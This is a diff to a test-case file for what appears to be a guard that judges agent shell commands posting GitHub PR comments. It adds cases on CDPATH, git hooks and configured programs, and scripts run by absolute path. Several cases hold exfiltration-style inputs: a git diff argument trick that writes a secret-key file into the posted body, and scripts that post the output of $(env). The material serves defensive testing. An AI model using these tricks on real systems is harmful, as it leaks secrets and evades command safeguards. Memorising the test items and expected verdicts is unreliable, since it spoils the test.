@@ -413,32 +413,32 @@ gh pr comment 1 --body-file {TMP}/b.md
 bash post.sh
 
 === CRW-875-22-32 | T
---why Exception B names git status (no option before the subcommand): the script of git status and a clean post is allowed.
+--why Exception B names git status (no option before the subcommand): the script of a clean post and git status after it is allowed (a git line before a post that reads a file is refused, rows 22-56).
 --file {TMP}/b.md
 hello
 --file {TMP}/w.sh
 #!/bin/sh
 cp /dev/null $1
 --file post.sh
-git status
 gh pr comment 1 --body-file {TMP}/b.md
+git status
 --cmd
 bash post.sh
 
 === CRW-875-22-32b | T
---why git log, show, diff, grep and commit without an option before the subcommand are exception B.
+--why git log, show, diff and grep without an option before the subcommand are exception B (git commit is not: it runs hooks, row 22-55); after the last post.
 --file {TMP}/b.md
 hello
 --file {TMP}/w.sh
 #!/bin/sh
 cp /dev/null $1
 --file post.sh
+gh pr comment 1 --body-file {TMP}/b.md
 git log --oneline -n 3
 git show --stat
 git diff --stat
 git grep -n hello
-git commit -m done
-gh pr comment 1 --body-file {TMP}/b.md
+git log --oneline -- docs
 --cmd
 bash post.sh
 
@@ -698,8 +698,8 @@ GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=diff.external GIT_CONFIG_VALUE_0={TMP}/w.sh 
 --file {TMP}/b.md
 hello
 --file post.sh
-git log -SOrder
 gh pr comment 1 --body-file {TMP}/b.md
+git log -SOrder
 --cmd
 bash post.sh
 
@@ -708,9 +708,9 @@ bash post.sh
 --file {TMP}/b.md
 hello
 --file post.sh
+gh pr comment 1 --body-file {TMP}/b.md
 git grep -eOpen
 git grep -e -O
-gh pr comment 1 --body-file {TMP}/b.md
 --cmd
 bash post.sh
 
@@ -733,3 +733,213 @@ git grep -3O hello
 gh pr comment 1 --body-file {TMP}/b.md
 --cmd
 bash post.sh
+
+# Post-evaluation round (the evaluation of e6fed165): CDPATH at a script boundary, the zsh cdpath array, git long options and
+# configured code, a script run by an absolute path.
+
+=== CRW-875-22-50 | U
+--why CDPATH in the environment of a script survives into its body: entry.sh's cd sub may land in a CDPATH directory, so the script it runs from there cannot be proven.
+--file entry.sh
+cd sub
+bash post.sh
+--file sub/post.sh
+echo clean
+--cmd
+CDPATH=/x bash entry.sh
+
+=== CRW-875-22-50b | U
+--why export CDPATH before the script: the body is read with CDPATH set.
+--file entry.sh
+cd sub
+bash post.sh
+--file sub/post.sh
+echo clean
+--cmd
+export CDPATH=/x; bash entry.sh
+
+=== CRW-875-22-50c | U
+--why env CDPATH=... before the script.
+--file entry.sh
+cd sub
+bash post.sh
+--file sub/post.sh
+echo clean
+--cmd
+env CDPATH=/x bash entry.sh
+
+=== CRW-875-22-50d | U
+--why source of the script under a CDPATH prefix assignment.
+--file entry.sh
+cd sub
+bash post.sh
+--file sub/post.sh
+echo clean
+--cmd
+CDPATH=/x source entry.sh
+
+=== CRW-875-22-51 | T
+--why Control: under CDPATH a ./ cd inside the script resolves as without it, so the script is read from the directory reached.
+--file entry.sh
+cd ./sub
+bash post.sh
+--file sub/post.sh
+echo clean
+--cmd
+CDPATH=/x bash entry.sh
+
+=== CRW-875-22-52 | U
+--why The zsh cdpath array searches a bare-name cd like CDPATH: the script cannot be proven.
+--file sub/clean.sh
+echo clean
+--cmd
+cdpath=(/x); cd sub; bash clean.sh
+
+=== CRW-875-22-52b | U
+--why read CDPATH sets the search path too.
+--file sub/clean.sh
+echo clean
+--cmd
+read CDPATH <<< /x; cd sub; bash clean.sh
+
+=== CRW-875-22-52c | U
+--why printf -v CDPATH sets it as well.
+--file sub/clean.sh
+echo clean
+--cmd
+printf -v CDPATH %s /x; cd sub; bash clean.sh
+
+=== CRW-875-22-52d | U
+--why A loop variable named CDPATH sets it.
+--file sub/clean.sh
+echo clean
+--cmd
+for CDPATH in /x; do :; done; cd sub; bash clean.sh
+
+=== CRW-875-22-53 | T
+--why Control: the cdpath array does not move a ./ cd.
+--file sub/clean.sh
+echo clean
+--cmd
+cdpath=(/x); cd ./sub; bash clean.sh
+
+=== CRW-875-22-54 | Q
+--why git diff --src-prefix takes -- as its value, so the --output after it writes the patch to the body file the next line posts (git is also a configured program, so any git line refuses a post that reads a file).
+--file {TMP}/b.md
+hello
+--file {TMP}/s.txt
+MY_API_KEY=sentinel
+--file post.sh
+git diff --no-index --src-prefix -- --output={TMP}/b.md /dev/null {TMP}/s.txt
+gh pr comment 1 --body-file {TMP}/b.md
+--cmd
+bash post.sh
+
+=== CRW-875-22-55 | Q
+--why git commit runs the hooks of the repository (a hook can rewrite the body file between the lines): it is not a reading subcommand, and the post after it is refused.
+--file {TMP}/b.md
+hello
+--file post.sh
+git commit --allow-empty -m done
+gh pr comment 1 --body-file {TMP}/b.md
+--cmd
+bash post.sh
+
+=== CRW-875-22-56 | Q
+--why git status may run core.fsmonitor and git diff a textconv or external diff driver of the repository: a post that reads a file after a git line may read a file that program wrote.
+--file {TMP}/b.md
+hello
+--file post.sh
+git status
+gh pr comment 1 --body-file {TMP}/b.md
+--cmd
+bash post.sh
+
+=== CRW-875-22-56b | T
+--why A git line after the last post cannot change what that post read.
+--file {TMP}/b.md
+hello
+--file post.sh
+gh pr comment 1 --body-file {TMP}/b.md
+git status
+--cmd
+bash post.sh
+
+=== CRW-875-22-56c | Q
+--why The git line is in the text that runs the script: it happens before the script's post reads its file.
+--file {TMP}/b.md
+hello
+--file post.sh
+gh pr comment 1 --body-file {TMP}/b.md
+--cmd
+git status; bash post.sh
+
+=== CRW-875-22-56d | Q
+--why A script that runs git, run before the script that posts, may have changed the file the post reads.
+--file {TMP}/b.md
+hello
+--file g.sh
+git log -1
+--file post.sh
+gh pr comment 1 --body-file {TMP}/b.md
+--cmd
+bash g.sh; bash post.sh
+
+=== CRW-875-22-56e | Q
+--why rg reads a configuration file whose --pre runs a program: a post after an rg line is refused like one after git.
+--file {TMP}/b.md
+hello
+--file post.sh
+rg hello {TMP}/b.md
+gh pr comment 1 --body-file {TMP}/b.md
+--cmd
+bash post.sh
+
+=== CRW-875-22-57 | P
+--why A script run by its absolute path is read like one run by a relative path (D2): the posting script is refused.
+--file {TMP}/post.sh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+{TMP}/post.sh
+
+=== CRW-875-22-57b | P
+--why The absolute script behind a prefix.
+--file {TMP}/post.sh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+timeout 30 {TMP}/post.sh
+
+=== CRW-875-22-57c | P
+--why The absolute script behind sudo and a list.
+--file {TMP}/post.sh
+#!/bin/sh
+gh pr comment 1 -b "$(env)"
+--cmd
+true && sudo {TMP}/post.sh
+
+=== CRW-875-22-57d | B
+--why Control: an absolute script that holds no post is not judged.
+--file {TMP}/clean.sh
+#!/bin/sh
+echo clean
+--cmd
+{TMP}/clean.sh
+
+=== CRW-875-22-57e | B
+--why Control: an installed binary named by its absolute path is not a script.
+--cmd
+/bin/ls
+
+=== CRW-875-22-57f | T
+--why An installed binary named by its absolute path after a write to a destination the reader cannot name: only a write that names the binary would make it another file, so it stays allowed.
+--cmd
+echo x > $OUT; /bin/ls
+
+=== CRW-875-22-57g | Q
+--why An absolute script after a write to a destination the reader cannot name may be the file that write replaced: the script is not the one read, so it is refused.
+--file {TMP}/clean.sh
+#!/bin/sh
+echo clean
+--cmd
+echo x > $OUT; {TMP}/clean.sh
